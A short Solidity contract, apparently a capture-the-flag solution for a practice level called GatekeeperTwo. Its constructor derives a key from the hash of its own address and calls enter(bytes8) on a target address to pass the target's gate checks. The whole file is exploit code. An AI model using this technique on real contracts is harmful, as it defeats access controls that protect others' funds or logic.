pragma solidity ^0.6.0;

contract GatekeeperTwoAttack {
    constructor(address _adr) public {
        bytes8 _key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^  uint64(0) - 1);
        _adr.call(abi.encodeWithSignature('enter(bytes8)',_key));
    }
}